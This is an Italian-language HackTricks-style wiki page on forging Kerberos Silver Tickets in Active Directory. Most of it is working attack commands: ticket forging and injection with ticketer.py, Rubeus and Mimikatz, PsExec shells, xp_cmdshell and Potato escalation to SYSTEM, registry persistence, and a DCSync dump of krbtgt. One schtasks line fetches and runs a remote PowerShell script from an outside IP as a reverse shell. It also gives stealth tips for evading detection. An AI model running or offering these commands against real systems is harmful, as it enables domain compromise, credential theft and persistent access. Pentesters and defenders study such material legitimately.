# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

L'attacco **Silver Ticket** sfrutta i service ticket in ambienti Active Directory (AD). Questo metodo si basa sull'**acquisizione dell'NTLM hash di un account di servizio**, come un account computer, per forgiare un Ticket Granting Service (TGS) ticket. Con questo ticket forgiato, un attacker può accedere a servizi specifici nella rete, **impersonando qualsiasi utente**, solitamente con l'obiettivo di ottenere privilegi amministrativi. È sottolineato che usare chiavi AES per forgiare i ticket è più sicuro e meno rilevabile.

> [!WARNING]
> Silver Tickets sono meno rilevabili dei Golden Tickets perché richiedono solo l'**hash dell'account di servizio**, non l'account krbtgt. Tuttavia, sono limitati al servizio specifico che prendono di mira. Inoltre, basta rubare la password di un utente.
> Inoltre, se comprometti la **password di un account con uno SPN** puoi usare quella password per creare un Silver Ticket che impersona qualsiasi utente verso quel servizio.

### Modern Kerberos changes (AES-only domains)

- Windows updates a partire dall'**8 Nov 2022 (KB5021131)** impostano di default i service ticket su **AES session keys** quando possibile e stanno deprecando RC4. I DC sono previsti con RC4 **disabilitato di default entro metà 2026**, quindi affidarsi a hash NTLM/RC4 per silver tickets fallisce sempre più spesso con `KRB_AP_ERR_MODIFIED`. Estrai sempre le **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) per l'account di servizio target.
- Se l'account di servizio `msDS-SupportedEncryptionTypes` è limitato ad AES, devi forgiare con `/aes256` o `-aesKey`; RC4 (`/rc4` o `-nthash`) non funzionerà anche se possiedi l'NTLM hash.
- Gli account gMSA/computer ruotano ogni 30 giorni; dumpa la **AES key corrente** da LSASS, Secretsdump/NTDS, o DCsync prima di forgiare.
- OPSEC: il lifetime di default dei ticket negli strumenti è spesso **10 anni**; imposta durate realistiche (es., `-duration 600` minuti) per evitare il rilevamento tramite lifetimes anomali.

Per la creazione dei ticket, si impiegano tool diversi in base al sistema operativo:

### On Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Su Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Il servizio CIFS è indicato come un obiettivo comune per accedere al file system della vittima, ma anche altri servizi come HOST e RPCSS possono essere sfruttati per attività e query WMI.

### Esempio: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Se possiedi l'hash NTLM (o la chiave AES) di un account di servizio SQL (e.g., sqlsvc), puoi forgiare un TGS per lo SPN MSSQL e impersonare qualsiasi utente verso il servizio SQL. Da lì, abilita xp_cmdshell per eseguire comandi come l'account di servizio SQL. Se quel token ha SeImpersonatePrivilege, esegui una chain con Potato per elevare a SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Se il contesto risultante dispone di SeImpersonatePrivilege (spesso vero per service accounts), usa una variante di Potato per ottenere SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Ulteriori dettagli sull'abuso di MSSQL e sull'abilitazione di xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Panoramica delle tecniche Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Servizi disponibili

| Tipo di servizio                            | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>A seconda del sistema operativo anche:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In alcune occasioni puoi semplicemente richiedere: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** puoi **richiedere tutti** questi ticket usando il parametro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets - ID evento

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- L'assenza di 4768/4769 precedenti sul DC per lo stesso client/service è un indicatore comune che un TGS contraffatto sia stato presentato direttamente al servizio.
- Una durata del ticket anormalmente lunga o un tipo di crittografia inaspettato (RC4 quando il dominio impone AES) risaltano anch'essi nei dati 4769/4624.

## Persistenza

Per evitare che le macchine ruotino la password ogni 30 giorni, impostare `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` oppure si può impostare `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` su un valore maggiore di 30 giorni per indicare il periodo di rotazione della password della macchina.

## Abuso dei Service tickets

Negli esempi seguenti immaginiamo che il ticket sia stato ottenuto impersonando l'account administrator.

### CIFS

Con questo ticket sarai in grado di accedere alle cartelle `C$` e `ADMIN$` via **SMB** (se esposte) e copiare file in una parte del filesystem remoto facendo qualcosa del tipo:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Potrai anche ottenere una shell all'interno dell'host o eseguire comandi arbitrari usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con questo permesso puoi creare attività pianificate su computer remoti ed eseguire comandi arbitrari:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con questi tickets puoi **eseguire WMI nel sistema della vittima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Trova **maggiori informazioni su wmiexec** nella seguente pagina:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con accesso winrm a un computer puoi **accedervi** e persino ottenere una PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulta la pagina seguente per scoprire **altri modi per connetterti a un host remoto usando winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Nota che **winrm deve essere attivo e in ascolto** sul computer remoto per potervi accedere.

### LDAP

Con questo privilegio puoi effettuare un dump del database del DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Per saperne di più su DCSync** consulta la seguente pagina:


{{#ref}}
dcsync.md
{{#endref}}


## Riferimenti

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)



{{#include ../../banners/hacktricks-training.md}}
